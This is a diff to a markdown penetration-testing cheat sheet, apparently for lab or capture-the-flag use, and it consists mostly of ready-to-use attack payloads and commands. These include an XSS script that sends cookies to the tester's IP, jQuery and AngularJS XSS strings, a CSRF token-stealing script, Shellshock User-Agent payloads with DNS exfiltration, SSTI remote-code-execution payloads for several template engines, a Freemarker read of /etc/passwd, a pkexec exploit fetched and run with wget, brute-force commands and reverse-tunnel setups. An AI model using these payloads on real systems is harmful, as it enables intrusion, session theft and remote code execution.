@@ -10,6 +10,7 @@
 - nmap
     - Static Binary
         - https://github.com/ernw/static-toolbox/releases
+        - https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/nmap.exe
     - Parameters
         - `-A` : Enable OS detection, version detection, script scanning, and traceroute
         - `-p-` : Scan all ports
@@ -18,6 +19,7 @@
         - `-Pn` : No ping
         - `--script=vuln` : Scan vulnerability
         - `-p139,445` : Only scan 139,445 port
+        - `-sn` : Host ping scan
     - Fast UDP Scan
         - `sudo nmap -sUV -T4 -F --version-intensity 0 {IP}`
 - RustScan
@@ -35,10 +37,24 @@
             - `/usr/share/dnsrecon/subdomains-top1mil.txt`
 ### Front-End
 #### XSS
+- Cheatsheet
+    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 - Steal Cookie
 	- `<script>new Image().src="http://{my_ip}:1234/"+document.cookie</script>`
 	- `nc -l 1234`
+- JQuery
+```
+$(`h2:contains("<img src=1 onerror=alert(1)>"`)
+$(`h2:contains(""<img src=1 onerror=alert(1)>`)
+```
+- Angular JS
+    - `{{constructor.constructor('alert(1)')()}}`
+- JS feature
+    - `"<><meow>".replace("<",1).replace(">",2)` = `12<meow>`
+        - Replace only apply first match 
+
 #### CSRF
+- POST
 ```html
 <form id="myForm" name="myForm" action="/change_pass.php" method="POST">
 <input type=hidden name="password" id="password" value="meowmeow"/>
@@ -46,6 +62,28 @@
 <input type=hidden name="submit" id="submit" value="submit"/>
 <script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
 ```
+
+- Get CSRF Token Before POST
+```javascript
+function post_data(csrf_token){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/my-account/change-email', true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("email=meow%40meow.meow&csrf="+csrf_token);
+}
+
+function get_csrf() {
+    var re = /[A-Za-z0-9]{32}/g;
+    csrf_token = this.responseText.match(re)[0];
+    post_data(csrf_token);
+}
+
+var get_csrf_request = new XMLHttpRequest();
+get_csrf_request.addEventListener("load", get_csrf);
+get_csrf_request.open("GET", "https://xxx/my-account");
+get_csrf_request.send();
+```
+
 ### Server
 #### Apache
 - Default log path
@@ -56,6 +94,8 @@
     - Add `() { :;}; echo; /usr/bin/id` to User-Agent
         - Must use Absolute path
         - `User-Agent: (){ :; }; /bin/ping -c 1 {MY_IP}`
+        - `USer-Agent: () { :; }; /usr/bin/nslookup $(whoami).meow.org`
+            - DNS Only
     - nmap test
         - `nmap {IP} -p {PORT} --script=http-shellshock --script-args uri=/cgi-bin/{FILE_NAME}.cgi`
 - Default config path
@@ -147,10 +187,61 @@
 	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
 - Adminer (SQLadmin)
     - https://www.adminer.org/
+### SSTI
+#### ERB (Ruby)
+- Test
+    - `<%= 7 * 7 %>`
+- RCE
+    - `<%= system("whoami") %>`
+
+#### Tornado (Python)
+- Test
+    - `{{7*7}}`
+- RCE
+    - `{% import os %}{{os.popen("whoami").read()}}`
+
+#### Freemarker (Java)
+- Test
+    - `${7*7}`
+- RCE
+    - `${"freemarker.template.utility.Execute"?new()("whoami")}`
+- Read file from sandbox
+    - `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}`
+        - Use Cyberchef "From Decimal" to decode 
+#### Handlebars (NodeJS)
+- RCE
+    ```
+    {{#with "s" as |string|}}
+      {{#with "e"}}
+        {{#with split as |conslist|}}
+          {{this.pop}}
+          {{this.push (lookup string.sub "constructor")}}
+          {{this.pop}}
+          {{#with string.split as |codelist|}}
+            {{this.pop}}
+            {{this.push "return require('child_process').exec('id');"}}
+            {{this.pop}}
+            {{#each conslist}}
+              {{#with (string.sub.apply 0 codelist)}}
+                {{this}}
+              {{/with}}
+            {{/each}}
+          {{/with}}
+        {{/with}}
+      {{/with}}
+    {{/with}}
+    ```
+
+#### Jinja2 (Python)
+- For flask, Django ......
+- Secret key
+    - `{{settings.SECRET_KEY}}`
+
+
 ### CMS
 #### Wordpress
 - WPScan
-    - `wpscan --url {URL} –-enumerate p,t,u --plugins-detection aggressive -t 30`
+    - `wpscan --url {URL} --enumerate p,t,u --plugins-detection aggressive -t 30`
         - enumerate
             - p : plugin
             - t : theme
@@ -315,6 +406,10 @@
     - `select sql from sqlite_master WHERE type='table'`
 - Data
     - `select {Column} from {Table}`
+### SSRF
+- Localhost
+    - `localhost`
+    - `127.0.0.1`, `127.0.0.255`, `127.255.254.255`
 ## Client Side Attack
 ### Office Macro
 - File type : `docm` or `doc`, doesn't support `docx`
@@ -620,7 +715,7 @@
 - [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
 - Compile for old OS
     - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
-- [CVE-2021-4034 (pkexec)](https://haxx.in/files/blasty-vs-pkexec.c)
+- [CVE-2021-4034 (pkexec) (pwnkit)](https://haxx.in/files/blasty-vs-pkexec.c)
     - `gcc blasty-vs-pkexec.c -o meow`
     - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
 - [2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
@@ -906,6 +1001,9 @@ iptables -X
             - `hydra -l {username} -P {path_to_wordlist} {domain_name_without http/s} http{s}-post-form "{/{path}}:username=^USER^&password=^PASS^&data=data:{string_if_fail}"`
         - ftp
             - `hydra -l {username} -P {wordlist} ftp://{IP}`
+
+- Cowbar
+    -  `crowbar -b rdp -s {IP}/32 -U {User List} -C {Password List}`
 - John the ripper
     - Crack hash like `/etc/shadow`
     - Support tools
@@ -952,6 +1050,7 @@ iptables -X
         - `gunzip  {filename.gz}`
 - tcpdump
     - Recv icmp : `sudo tcpdump -i tun0 icmp`
+    - Capture package : `tcpdump -i {interface} -s 65535 -w {file.pcap}``
 ### Reverse tunnel forwarding
 - https://book.hacktricks.xyz/tunneling-and-port-forwarding
 - [Chisel](https://github.com/jpillora/chisel) 
@@ -965,8 +1064,10 @@ iptables -X
     - Proxy
         - Server `./chisel server -p {listen_port} --reverse`
         - Client `./chisel client {Remote_host}:{listen_port} R:socks`
-        - Default proxy port : 1080
+        - Default proxy port : 1080 (sock5)
             - Set `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` or firefox proxy
+        - Change proxy port to 9487
+            - Turn last statement to `R:9487:socks` 
 - SSH
     - Port Forwarding
         - `ssh -L {forward_port}:127.0.0.1:{forward_port} {remote_user}@{remote_ip} -p {ssh_port} -N -v -v`
@@ -980,6 +1081,10 @@ iptables -X
 - Unknown files
 	- `file {file_name}`
 	- `binwalk {file_name}`
+	    - Extract squashfs patch
+	        - `git clone https://github.com/threadexio/sasquatch`
+            - `./build.sh`
+        - `-e` Extract
 	- `xxd {file_name}`
 	- `foremost {file_name}`
 - dd
